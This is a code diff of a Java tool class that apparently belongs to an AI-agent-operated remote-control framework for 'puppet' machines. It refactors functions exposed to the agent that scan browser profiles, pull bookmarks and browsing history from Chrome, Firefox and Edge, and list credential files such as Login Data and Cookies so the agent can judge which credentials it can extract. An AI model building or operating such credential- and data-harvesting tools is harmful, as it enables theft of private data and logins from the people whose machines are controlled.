@@ -2,7 +2,7 @@ package org.leo.ai.tools.puppetnode;
 
 import org.leo.ai.agent.AiToolContext;
 import org.leo.ai.util.PuppetNodeSessionUtils;
-import org.leo.core.puppet.impl.JavaPuppetNode;
+import org.leo.core.puppet.capability.BrowserDataCapable;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import dev.langchain4j.agent.tool.Tool;
@@ -30,7 +30,7 @@ public class BrowserDataTools {
             return (Map<String, Object>) cached;
         }
 
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        BrowserDataCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, BrowserDataCapable.class);
         Map<String, Object> results = node.scanBrowserProfiles();
 
         if (results != null && isSuccess(results)) {
@@ -42,21 +42,21 @@ public class BrowserDataTools {
     @Tool("提取 puppet 侧所有浏览器的书签数据（Chrome/Firefox/Edge），返回书签名称和 URL。")
     public Map<String, Object> extractBrowserBookmarks() throws Exception {
         String sessionId = AiToolContext.requireSessionId();
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        BrowserDataCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, BrowserDataCapable.class);
         return node.extractBrowserBookmarks();
     }
 
     @Tool("提取 puppet 侧所有浏览器的浏览历史记录。可指定 limit 参数限制返回条数，默认 100。")
     public Map<String, Object> extractBrowserHistory(int limit) throws Exception {
         String sessionId = AiToolContext.requireSessionId();
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        BrowserDataCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, BrowserDataCapable.class);
         return node.extractBrowserHistory(limit > 0 ? limit : 100);
     }
 
     @Tool("列出 puppet 侧浏览器目录下的敏感文件（Login Data、Cookies、Web Data 等），用于判断可提取的凭据类型。")
     public Map<String, Object> listBrowserSensitiveFiles() throws Exception {
         String sessionId = AiToolContext.requireSessionId();
-        JavaPuppetNode node = PuppetNodeSessionUtils.getJavaPuppetNode(sessionId);
+        BrowserDataCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, BrowserDataCapable.class);
         return node.listBrowserSensitiveFiles();
     }
 
